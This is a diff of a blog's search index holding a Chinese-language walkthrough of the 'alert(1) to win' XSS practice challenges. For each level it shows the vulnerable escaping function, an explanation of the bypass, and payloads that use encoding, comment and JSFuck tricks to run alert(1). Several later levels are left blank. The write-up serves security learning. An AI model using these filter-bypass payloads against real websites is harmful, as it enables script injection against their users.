\n\</span><br><span class="line">         v.innerHTML &#x3D; &#39;&lt;a href&#x3D;#&gt;&#123;name&#125;&lt;&#x2F;a&gt;&#39;;       \n\</span><br><span class="line">      &lt;\&#x2F;script&gt;                                     \n\</span><br><span class="line">    &quot;,</span><br><span class="line">    &#123; name : s &#125;</span><br><span class="line">  );</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="分析-7"><a href="#分析-7" class="headerlink" title="分析"></a>分析</h2><p>代码对输入的<code>&lt;</code>、<code>&gt;</code>、<code>&amp;</code>、<code>&quot;</code>、<code>&#39;</code>、进行了转义，输入的字符串会拼接在<code>{name}</code>处。<br>由于没有过滤<code>\</code>，可以利用<code>JS</code>的8进制或者16进制编码来绕过。</p>
+<h3 id="payload-7"><a href="#payload-7" class="headerlink" title="payload"></a>payload</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">32个字符</span><br><span class="line">\x3cimg src onerror&#x3D;alert(1)\x3e</span><br><span class="line">26个字符</span><br><span class="line">\x3cstyle&#x2F;onload&#x3D;alert(1)  &#x2F;&#x2F;末尾有一个空格</span><br></pre></td></tr></table></figure>
+
+<h2 id="JSON-2"><a href="#JSON-2" class="headerlink" title="JSON 2"></a>JSON 2</h2><h3 id="源码-8"><a href="#源码-8" class="headerlink" title="源码"></a>源码</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">function escape(s) &#123;</span><br><span class="line">  s &#x3D; JSON.stringify(s).replace(&#x2F;&lt;\&#x2F;script&#x2F;gi, &#39;&#39;);</span><br><span class="line"></span><br><span class="line">  return &#39;&lt;script&gt;console.log(&#39; + s + &#39;);&lt;&#x2F;script&gt;&#39;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="分析-8"><a href="#分析-8" class="headerlink" title="分析"></a>分析</h3><p>对<code>&lt;/script</code>标签进行了过滤，由于正则中存在<code>i</code>修饰符，不区分大小写，不能使用大小写混合来绕过。</p>
+<p>由于直接将字符串替换为空，可以双写绕过。</p>
+<h3 id="payload-8"><a href="#payload-8" class="headerlink" title="payload"></a>payload</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;&#x2F;s&lt;&#x2F;scriptcript&gt;&lt;script&gt;alert(1)&#x2F;&#x2F;</span><br></pre></td></tr></table></figure>
+
+<h2 id="Callback-2"><a href="#Callback-2" class="headerlink" title="Callback 2"></a>Callback 2</h2><h3 id="源码-9"><a href="#源码-9" class="headerlink" title="源码"></a>源码</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">function escape(s) &#123;</span><br><span class="line">  &#x2F;&#x2F; Pass inn &quot;callback#userdata&quot;</span><br><span class="line">  var thing &#x3D; s.split(&#x2F;#&#x2F;); </span><br><span class="line"></span><br><span class="line">  if (!&#x2F;^[a-zA-Z\[\]&#39;]*$&#x2F;.test(thing[0])) return &#39;Invalid callback&#39;;</span><br><span class="line">  var obj &#x3D; &#123;&#39;userdata&#39;: thing[1] &#125;;</span><br><span class="line">  var json &#x3D; JSON.stringify(obj).replace(&#x2F;\&#x2F;&#x2F;g, &#39;\\&#x2F;&#39;);</span><br><span class="line">  return &quot;&lt;script&gt;&quot; + thing[0] + &quot;(&quot; + json +&quot;)&lt;&#x2F;script&gt;&quot;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="分析-9"><a href="#分析-9" class="headerlink" title="分析"></a>分析</h3><p>与第6题的类似，但是转义了<code>/</code>，导致<code>//</code>这个注释符无法使用，但是<code>JavaScript</code>的注释符有三种，分别是<code>//</code>、<code>/**/</code>、<code>&lt;!--</code><br>可以使用来注释。</p>
+<h3 id="payload-9"><a href="#payload-9" class="headerlink" title="payload"></a>payload</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#39;#&#39;;alert(1)&lt;!--</span><br></pre></td></tr></table></figure>
+
+<h2 id="Skandia-2"><a href="#Skandia-2" class="headerlink" title="Skandia 2"></a>Skandia 2</h2><h3 id="源码-10"><a href="#源码-10" class="headerlink" title="源码"></a>源码</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">function escape(s) &#123;</span><br><span class="line">  if (&#x2F;[&lt;&gt;]&#x2F;.test(s)) return &#39;-&#39;;</span><br><span class="line"></span><br><span class="line">  return &#39;&lt;script&gt;console.log(&quot;&#39; + s.toUpperCase() + &#39;&quot;)&lt;&#x2F;script&gt;&#39;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="分析-10"><a href="#分析-10" class="headerlink" title="分析"></a>分析</h3><p>代码过滤了<code>&lt;</code>、<code>&gt;</code>。还将所有输入的字母变成了大写，不能借助<code>toUpperCase()</code>的特性来解了。<br>可以利用<code>jsfuck</code>。直接将<code>&quot;);alert(1)//</code>中的<code>alert(1)</code>用<code>jsfuck</code>表示。</p>
+<p><a href="http://www.jsfuck.com/" target="_blank" rel="noopener">JSfuck</a></p>
+<p>但是直接使用工具生成的<code>jsfuck</code>太长了，不过我们还有另一种方法，就是<code>JS</code>的匿名函数。</p>
+<p>我们可以通过这种方法来执行任意方法。</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[][&#39;map&#39;][&#39;constructor&#39;](&#39;alert(1)&#39;)()</span><br></pre></td></tr></table></figure>
+
+<p>由于对字母进行了大写转换，我们可以将其进行8进制编码，然后闭合前面，注释后面。</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&quot;);[][&#39;\155\141\160&#39;][&#39;\143\157\156\163\164\162\165\143\164\157\162&#39;](&#39;\141\154\145\162\164(1)&#39;)()&#x2F;&#x2F;</span><br></pre></td></tr></table></figure>
+
+<h3 id="payload-10"><a href="#payload-10" class="headerlink" title="payload"></a>payload</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">方法一</span><br><span class="line">&quot;);[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]][([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]((![]+[])[+!+[]]+(![]+[])[!+[]+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]+(!![]+[])[+[]]+(![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[!+[]+!+[]+[+[]]]+[+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[!+[]+!+[]+[+[]]])()&#x2F;&#x2F;</span><br><span class="line">方法二</span><br><span class="line">&quot;);[][&#39;\155\141\160&#39;][&#39;\143\157\156\163\164\162\165\143\164\157\162&#39;](&#39;\141\154\145\162\164(1)&#39;)()&#x2F;&#x2F;</span><br></pre></td></tr></table></figure>
+
+<h2 id="iframe"><a href="#iframe" class="headerlink" title="iframe"></a>iframe</h2><h3 id="源码-11"><a href="#源码-11" class="headerlink" title="源码"></a>源码</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">function escape(s) &#123;</span><br><span class="line">  var tag &#x3D; document.createElement(&#39;iframe&#39;);</span><br><span class="line"></span><br><span class="line">  &#x2F;&#x2F; For this one, you get to run any code you want, but in a &quot;sandboxed&quot; iframe.</span><br><span class="line">  &#x2F;&#x2F;</span><br><span class="line">  &#x2F;&#x2F; https:&#x2F;&#x2F;4i.am&#x2F;?...raw&#x3D;... just outputs whatever you pass in.</span><br><span class="line">  &#x2F;&#x2F;</span><br><span class="line">  &#x2F;&#x2F; Alerting from 4i.am won&#39;t count.</span><br><span class="line"></span><br><span class="line">  s &#x3D; &#39;&lt;script&gt;&#39; + s + &#39;&lt;\&#x2F;script&gt;&#39;;</span><br><span class="line">  tag.src &#x3D; &#39;https:&#x2F;&#x2F;4i.am&#x2F;?:XSS&#x3D;0&amp;CT&#x3D;text&#x2F;html&amp;raw&#x3D;&#39; + encodeURIComponent(s);</span><br><span class="line"></span><br><span class="line">  window.WINNING &#x3D; function() &#123; youWon &#x3D; true; &#125;;</span><br><span class="line"></span><br><span class="line">  tag.setAttribute(&#39;onload&#39;, &#39;youWon &amp;&amp; alert(1)&#39;);</span><br><span class="line">  return tag.outerHTML;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="分析-11"><a href="#分析-11" class="headerlink" title="分析"></a>分析</h3><p>只要使<code>youWon</code>为<code>true</code>，这样就能执行<code>alert(1)</code>了。<br>解决思路是利用到<code>iframe</code>的特性，当在<code>iframe</code>中设置了一个<code>name</code>属性之后， 这个<code>name</code>属性的值就会变成<code>iframe</code>中的<code>window</code>对象的全局。</p>
+<h3 id="payload-11"><a href="#payload-11" class="headerlink" title="payload"></a>payload</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">name&#x3D;&quot;youWon&quot;</span><br></pre></td></tr></table></figure>
+
+<h2 id="TI-S-M"><a href="#TI-S-M" class="headerlink" title="TI(S)M"></a>TI(S)M</h2><h3 id="源码-12"><a href="#源码-12" class="headerlink" title="源码"></a>源码</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">function escape(s) &#123;</span><br><span class="line">  function json(s) &#123; return JSON.stringify(s).replace(&#x2F;\&#x2F;&#x2F;g, &#39;\\&#x2F;&#39;); &#125;</span><br><span class="line">  function html(s) &#123; return s.replace(&#x2F;[&lt;&gt;&quot;&amp;]&#x2F;g, function(s) &#123;</span><br><span class="line">                        return &#39;&amp;#&#39; + s.charCodeAt(0) + &#39;;&#39;; &#125;); &#125;</span><br><span class="line"></span><br><span class="line">  return (</span><br><span class="line">    &#39;&lt;script&gt;&#39; +</span><br><span class="line">      &#39;var url &#x3D; &#39; + json(s) + &#39;; &#x2F;&#x2F; We\&#39;ll use this later &#39; +</span><br><span class="line">    &#39;&lt;&#x2F;script&gt;\n\n&#39; +</span><br><span class="line">    &#39;  &lt;!-- for debugging --&gt;\n&#39; +</span><br><span class="line">    &#39;  URL: &#39; + html(s) + &#39;\n\n&#39; +</span><br><span class="line">    &#39;&lt;!-- then suddenly --&gt;\n&#39; +</span><br><span class="line">    &#39;&lt;script&gt;\n&#39; +</span><br><span class="line">    &#39;  if (!&#x2F;^http:.*&#x2F;.test(url)) console.log(&quot;Bad url: &quot; + url);\n&#39; +</span><br><span class="line">    &#39;  else new Image().src &#x3D; url;\n&#39; +</span><br><span class="line">    &#39;&lt;&#x2F;script&gt;&#39;</span><br><span class="line">  );</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="分析-12"><a href="#分析-12" class="headerlink" title="分析"></a>分析</h3><p>本题用到了一个小<code>trick</code>:<br><code>HTML5</code>解析器会将<code>&lt;!--&lt;script&gt;</code>到<code>&lt;/script&gt;</code>之间的任何东西都当作<code>JavaScript</code>代码处理，同时要确保代码中还有一个<code>--&gt;</code>来防止解析器报语法错误。</p>
+<p>首先输入一个<code>&lt;!--&lt;script&gt;</code>，此时的输出中</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;var url &#x3D; &quot;&lt;!--&lt;script&gt;&quot;; &#x2F;&#x2F; We&#39;ll use this later &lt;&#x2F;script&gt;</span><br><span class="line"></span><br><span class="line">  &lt;!-- for debugging --&gt;</span><br><span class="line">  URL: &amp;#60;!--&amp;#60;script&amp;#62;</span><br><span class="line"></span><br><span class="line">&lt;!-- then suddenly --&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">  if (!&#x2F;^http:.*&#x2F;.test(url)) console.log(&quot;Bad url: &quot; + url);</span><br><span class="line">  else new Image().src &#x3D; url;</span><br><span class="line">&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure>
+
+<p>这一段所有的代码都会当做<code>JS</code>执行。<br>在后面有个正则表达式<code>!/^http:.*/</code>，其中的<code>*/</code>可以当做注释，那么我们在前面再加入一个<code>/*</code>即可闭合。<br>此时的输出为</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;var url &#x3D; &quot;\&#x2F;*&lt;!--&lt;script&gt;&quot;; &#x2F;&#x2F; We&#39;ll use this later &lt;&#x2F;script&gt;</span><br><span class="line"></span><br><span class="line">  &lt;!-- for debugging --&gt;</span><br><span class="line">  URL: &#x2F;*&amp;#60;!--&amp;#60;script&amp;#62;</span><br><span class="line"></span><br><span class="line">&lt;!-- then suddenly --&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">  if (!&#x2F;^http:.*&#x2F;.test(url)) console.log(&quot;Bad url: &quot; + url);</span><br><span class="line">  else new Image().src &#x3D; url;</span><br><span class="line">&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure>
+
+<p>在注释符之前添加要执行的代码就可以了。</p>
+<h3 id="payload-12"><a href="#payload-12" class="headerlink" title="payload"></a>payload</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">if(alert(1)&#x2F;*&lt;!--&lt;script&gt;</span><br></pre></td></tr></table></figure>
+
+<h2 id="JSON-3"><a href="#JSON-3" class="headerlink" title="JSON 3"></a>JSON 3</h2><h3 id="源码-13"><a href="#源码-13" class="headerlink" title="源码"></a>源码</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">function escape(s) &#123;</span><br><span class="line">    return s.split(&#39;#&#39;).map(function(v) &#123;</span><br><span class="line">        &#x2F;&#x2F; Only 20% of slashes are end tags; save 1.2% of total</span><br><span class="line">        &#x2F;&#x2F; bytes by only escaping those.</span><br><span class="line">        var json &#x3D; JSON.stringify(v).replace(&#x2F;&lt;\&#x2F;&#x2F;g, &#39;&lt;\\&#x2F;&#39;);</span><br><span class="line">        return &#39;&lt;script&gt;console.log(&#39; + json + &#39;)&lt;&#x2F;script&gt;&#39;;</span><br><span class="line">    &#125;).join(&#39;&#39;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="分析-13"><a href="#分析-13" class="headerlink" title="分析"></a>分析</h3><p>题目思路与上一个题类似，借助<code>&lt;!--&lt;script&gt;</code>来执行JS代码，不过因为后面没有<code>--&gt;</code>，解析器会报错，需要我们在后面构造一个<code>--&gt;</code>来避免报错。</p>
+<p>构造的<code>Payload</code>为``，此时输出为</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;console.log(&quot;&lt;!--&lt;script&gt;&quot;)&lt;&#x2F;script&gt;&lt;script&gt;console.log(&quot;)&#x2F;;alert(1)&#x2F;&#x2F;--&gt;&quot;)&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure>
+
+<p>其中<code>/script&gt;console.log(&quot;)/</code>被当做了正则表达式解析，后面通过分号分割后，成功执行代码<code>alert(1)</code>。</p>
+<h3 id="payload-13"><a href="#payload-13" class="headerlink" title="payload"></a>payload</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;!--&lt;script&gt;#)&#x2F;;alert(1)&#x2F;&#x2F;--&gt;</span><br></pre></td></tr></table></figure>
+
+<h2 id="Skandia-3"><a href="#Skandia-3" class="headerlink" title="Skandia 3"></a>Skandia 3</h2><h3 id="源码-14"><a href="#源码-14" class="headerlink" title="源码"></a>源码</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">function escape(s) &#123;</span><br><span class="line">  if (&#x2F;[\\&lt;&gt;]&#x2F;.test(s)) return &#39;-&#39;;</span><br><span class="line"></span><br><span class="line">  return &#39;&lt;script&gt;console.log(&quot;&#39; + s.toUpperCase() + &#39;&quot;)&lt;&#x2F;script&gt;&#39;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="分析-14"><a href="#分析-14" class="headerlink" title="分析"></a>分析</h3><h3 id="payload-14"><a href="#payload-14" class="headerlink" title="payload"></a>payload</h3><h2 id="RFC4627"><a href="#RFC4627" class="headerlink" title="RFC4627"></a>RFC4627</h2><h3 id="源码-15"><a href="#源码-15" class="headerlink" title="源码"></a>源码</h3><h3 id="分析-15"><a href="#分析-15" class="headerlink" title="分析"></a>分析</h3><h3 id="payload-15"><a href="#payload-15" class="headerlink" title="payload"></a>payload</h3><h2 id="Well"><a href="#Well" class="headerlink" title="Well"></a>Well</h2><h3 id="源码-16"><a href="#源码-16" class="headerlink" title="源码"></a>源码</h3><h3 id="分析-16"><a href="#分析-16" class="headerlink" title="分析"></a>分析</h3><h3 id="payload-16"><a href="#payload-16" class="headerlink" title="payload"></a>payload</h3><h2 id="No"><a href="#No" class="headerlink" title="No"></a>No</h2><h3 id="源码-17"><a href="#源码-17" class="headerlink" title="源码"></a>源码</h3><h3 id="分析-17"><a href="#分析-17" class="headerlink" title="分析"></a>分析</h3><h3 id="payload-17"><a href="#payload-17" class="headerlink" title="payload"></a>payload</h3><h2 id="K’Z’K"><a href="#K’Z’K" class="headerlink" title="K’Z’K"></a>K’Z’K</h2><h3 id="源码-18"><a href="#源码-18" class="headerlink" title="源码"></a>源码</h3><h3 id="分析-18"><a href="#分析-18" class="headerlink" title="分析"></a>分析</h3><h3 id="payload-18"><a href="#payload-18" class="headerlink" title="payload"></a>payload</h3><h2 id="最后"><a href="#最后" class="headerlink" title="最后"></a>最后</h2>]]></content>
+      <categories>
+        <category>WEB</category>
+      </categories>
+      <tags>
+        <tag>XSS</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>XSS从0到1</title>
     <url>/posts/46185.html</url>
     <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><h3 id="什么是XSS"><a href="#什么是XSS" class="headerlink" title="什么是XSS"></a>什么是XSS</h3><p>跨站脚本(Cross-Site Scripting,简称为XSS或跨站脚本或跨站脚本攻击)是一种针对网站应用程序的安全漏洞攻击技术，是代码注入的一种。它允许恶意用户将代码注入网页，其他用户在浏览网页时就会受到影响。恶意用户利用xss代码攻击成功后，可能得到很高的权限、私密网页内容、会话和cookie等各种内容。</p>
@@ -4207,126 +4327,6 @@ string substr(string, start, length)
 <h4 id="Example-9-–-直接在-后面添加alert-1"><a href="#Example-9-–-直接在-后面添加alert-1" class="headerlink" title="Example 9 – 直接在#后面添加alert(1)"></a>Example 9 – 直接在#后面添加alert(1)</h4><p>DOM型 XSS 的典型代表，恶意输入并没有直接反映在返回的HTML中，而要依赖浏览器动态执行JavaScript之后，恶意输入才能被执行。</p>
 <p>把URL改成<code>http://192.168.150.157/xss/example9.php#alert(1)</code><br>首先看到代码里有<code>document.write(location.hash.substring(1));&lt;/script&gt;</code>，所以显然入口在这里。<br><code>document.write()</code>是把括号中的内容写到<code>HTML</code>文档中，<code>location.hash</code>就是得到<code>URL</code>中<code>#</code>开始的字符串，<code>substring(1)</code>就得到了<code>#</code>后的字符串。<br>所以就在#后加入payload：<code>#alert(1)</code></p>
 ]]></content>
-      <categories>
-        <category>WEB</category>
-      </categories>
-      <tags>
-        <tag>XSS</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>XSS靶场练习一</title>
-    <url>/posts/32710.html</url>
-    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>靶场地址：<a href="https://alf.nu/alert1" target="_blank" rel="noopener">alert(1) to win</a></p>
-<h2 id="Warmup"><a href="#Warmup" class="headerlink" title="Warmup"></a>Warmup</h2><h3 id="源码"><a href="#源码" class="headerlink" title="源码"></a>源码</h3><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">escape</span>(<span class="params">s</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="string">'&lt;script&gt;console.log("'</span>+s+<span class="string">'");&lt;/script&gt;'</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><p>代码将输入直接拼接到了返回的字符串中，没有任何过滤，直接闭合<code>console.log(&quot;</code>即可。</p>
-<h3 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">13个字符</span><br><span class="line">&quot;);alert(1)&#x2F;&#x2F;</span><br><span class="line">12个字符</span><br><span class="line">&quot;);alert(1,&quot;</span><br></pre></td></tr></table></figure>
-
-<h2 id="Adobe"><a href="#Adobe" class="headerlink" title="Adobe"></a>Adobe</h2><h3 id="源码-1"><a href="#源码-1" class="headerlink" title="源码"></a>源码</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">function escape(s) &#123;</span><br><span class="line">  s &#x3D; s.replace(&#x2F;&quot;&#x2F;g, &#39;\\&quot;&#39;);</span><br><span class="line">  return &#39;&lt;script&gt;console.log(&quot;&#39; + s + &#39;&quot;);&lt;&#x2F;script&gt;&#39;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<h3 id="分析-1"><a href="#分析-1" class="headerlink" title="分析"></a>分析</h3><p><img src="/posts/32710/1.png" alt="replace"></p>
-<p>代码将输入的双引号加了一个<code>\</code>进行了转义，这样我们就不能像第一题那样闭合<code>console.log</code>了，但是没啥影响，有两种方法：</p>
-<ul>
-<li>闭合之前的<code>&lt;script&gt;</code>，然后再写一个<code>&lt;script&gt;</code></li>
-<li>使用<code>\</code>来转义对<code>&quot;</code>进行转义的<code>\</code>，从而绕过对<code>&quot;</code>的过滤</li>
-</ul>
-<h3 id="payload-1"><a href="#payload-1" class="headerlink" title="payload"></a>payload</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">方法一</span><br><span class="line">&lt;&#x2F;script&gt;&lt;script&gt;alert(1)&#x2F;&#x2F;</span><br><span class="line">方法二</span><br><span class="line">\&quot;);alert(1)&#x2F;&#x2F;</span><br></pre></td></tr></table></figure>
-
-<h2 id="JSON"><a href="#JSON" class="headerlink" title="JSON"></a>JSON</h2><h3 id="源码-2"><a href="#源码-2" class="headerlink" title="源码"></a>源码</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">function escape(s) &#123;</span><br><span class="line">  s &#x3D; JSON.stringify(s);</span><br><span class="line">  return &#39;&lt;script&gt;console.log(&#39; + s + &#39;);&lt;&#x2F;script&gt;&#39;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<h3 id="分析-2"><a href="#分析-2" class="headerlink" title="分析"></a>分析</h3><p><img src="/posts/32710/2.png" alt="JSON.stringify"></p>
-<p>代码将输入使用<code>JSON.stringify</code>进行了处理，与第二题的方法一思路相同。</p>
-<h3 id="payload-2"><a href="#payload-2" class="headerlink" title="payload"></a>payload</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;&#x2F;script&gt;&lt;script&gt;alert(1)&#x2F;&#x2F;</span><br></pre></td></tr></table></figure>
-
-<h2 id="Markdown"><a href="#Markdown" class="headerlink" title="Markdown"></a>Markdown</h2><h3 id="源码-3"><a href="#源码-3" class="headerlink" title="源码"></a>源码</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">function escape(s) &#123;</span><br><span class="line">  var text &#x3D; s.replace(&#x2F;&lt;&#x2F;g, &#39;&lt;&#39;).replace(&#x2F;&quot;&#x2F;g, &#39;&quot;&#39;);</span><br><span class="line">  &#x2F;&#x2F; URLs</span><br><span class="line">  text &#x3D; text.replace(&#x2F;(http:\&#x2F;\&#x2F;\S+)&#x2F;g, &#39;&lt;a href&#x3D;&quot;$1&quot;&gt;$1&lt;&#x2F;a&gt;&#39;);</span><br><span class="line">  &#x2F;&#x2F; [[img123|Description]]</span><br><span class="line">  text &#x3D; text.replace(&#x2F;\[\[(\w+)\|(.+?)\]\]&#x2F;g, &#39;&lt;img alt&#x3D;&quot;$2&quot; src&#x3D;&quot;$1.gif&quot;&gt;&#39;);</span><br><span class="line">  return text;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<h3 id="分析-3"><a href="#分析-3" class="headerlink" title="分析"></a>分析</h3><p>代码进行了三步操作</p>
-<ol>
-<li>第一步，将<code>&lt;</code>和<code>&quot;</code>转成了HTML实体</li>
-<li>第二步，如果存在<code>http://</code>的字符串， 会可以生成一个<code>a</code>标签</li>
-<li>第三步，解析Markdown的图片的语法，如果存在<code>[[img123|Description]]</code>格式的字符串，则变为``。</li>
-</ol>
-<p>开头对<code>&quot;</code>和<code>&lt;</code>进行了编码操作，所以不能直接传入<code>&quot;</code>来闭合，当前思路就是构造一个字符串，使其满足后两个正则，从而引入<code>a</code>标签中的<code>&quot;</code>，从而闭合<code>img</code>标签的<code>alt</code>属性。</p>
-<h3 id="payload-3"><a href="#payload-3" class="headerlink" title="payload"></a>payload</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[[a|http:&#x2F;&#x2F;onerror&#x3D;alert(1)&#x2F;&#x2F;]]</span><br></pre></td></tr></table></figure>
-
-<h2 id="DOM"><a href="#DOM" class="headerlink" title="DOM"></a>DOM</h2><h3 id="源码-4"><a href="#源码-4" class="headerlink" title="源码"></a>源码</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">function escape(s) &#123;</span><br><span class="line">    &#x2F;&#x2F; Slightly too lazy to make two input fields.</span><br><span class="line">    &#x2F;&#x2F; Pass in something like &quot;TextNode#foo&quot;</span><br><span class="line">    var m &#x3D; s.split(&#x2F;#&#x2F;);</span><br><span class="line"></span><br><span class="line">    &#x2F;&#x2F; Only slightly contrived at this point.</span><br><span class="line">    var a &#x3D; document.createElement(&#39;div&#39;);</span><br><span class="line">    a.appendChild(document[&#39;create&#39; + m[0]].apply(document, m.slice(1)));</span><br><span class="line">    return a.innerHTML;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<h3 id="分析-4"><a href="#分析-4" class="headerlink" title="分析"></a>分析</h3><p>代码实现了一个根据输入来创建的<code>DOM</code>节点的功能。<br>如果输入是<code>TextNode#foo</code>，那么执行的代码就是<code>document.createTextNode(&quot;foo&quot;)</code>。</p>
-<p><strong>常用命令</strong></p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">createElement() 创建一个元素节点</span><br><span class="line">createTextNode() 创建一个文本节点</span><br><span class="line">createAttribute() 创建一个属性节点</span><br><span class="line">createComment() 创建一个注释节点</span><br></pre></td></tr></table></figure>
-
-<p>经过尝试，通过<code>createComment()</code>创建一个注释节点，然后闭合注释可以达到代码执行的目的。</p>
-<h3 id="payload-4"><a href="#payload-4" class="headerlink" title="payload"></a>payload</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">34个字符</span><br><span class="line">Comment#&gt;&lt;script&gt;alert(1)&lt;&#x2F;script&gt;</span><br><span class="line">32个字符</span><br><span class="line">Comment#&gt;&lt;iframe onload&#x3D;alert(1)</span><br></pre></td></tr></table></figure>
-
-<h2 id="Callback"><a href="#Callback" class="headerlink" title="Callback"></a>Callback</h2><h3 id="源码-5"><a href="#源码-5" class="headerlink" title="源码"></a>源码</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">function escape(s) &#123;</span><br><span class="line">  &#x2F;&#x2F; Pass inn &quot;callback#userdata&quot;</span><br><span class="line">  var thing &#x3D; s.split(&#x2F;#&#x2F;); </span><br><span class="line"></span><br><span class="line">  if (!&#x2F;^[a-zA-Z\[\]&#39;]*$&#x2F;.test(thing[0])) return &#39;Invalid callback&#39;;</span><br><span class="line">  var obj &#x3D; &#123;&#39;userdata&#39;: thing[1] &#125;;</span><br><span class="line">  var json &#x3D; JSON.stringify(obj).replace(&#x2F;&lt;&#x2F;g, &#39;\\u003c&#39;);</span><br><span class="line">  return &quot;&lt;script&gt;&quot; + thing[0] + &quot;(&quot; + json +&quot;)&lt;&#x2F;script&gt;&quot;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
